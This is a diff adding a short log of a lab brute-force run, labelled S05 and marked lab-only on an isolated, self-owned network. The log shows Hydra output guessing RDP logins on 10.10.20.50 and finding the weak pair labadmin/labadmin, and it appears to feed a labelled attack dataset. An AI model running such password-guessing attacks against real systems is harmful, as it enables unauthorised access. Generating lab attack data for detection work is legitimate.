@@ -1,0 +1,18 @@
+============================================================
+ S05 | attack_cat=Brute Force | phase=windows
+ LAB ONLY — jaringan terisolasi, target milik sendiri.
+ Waktu mulai (UTC): 2026-10-28T09:03:10Z
+============================================================
+[32m>>> START[0m S05 target=10.10.20.50 @ 2026-10-28T09:03:10Z
+Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-28 09:03:10
+[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
+[DATA] max 2 tasks per 1 server, overall 2 tasks, 80 login tries (l:8/p:10), ~40 tries per task
+[DATA] attacking rdp://10.10.20.50:3389/
+[3389][rdp] host: 10.10.20.50   misc: (null)   login: labadmin   password: labadmin
+[STATUS] attack finished for 10.10.20.50 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-28 09:03:11
+[32m<<< END[0m   S05 @ 2026-10-28T09:03:11Z  (marker -> /home/kali/attack-markers.csv)
+Output: s05-rdp.hydra
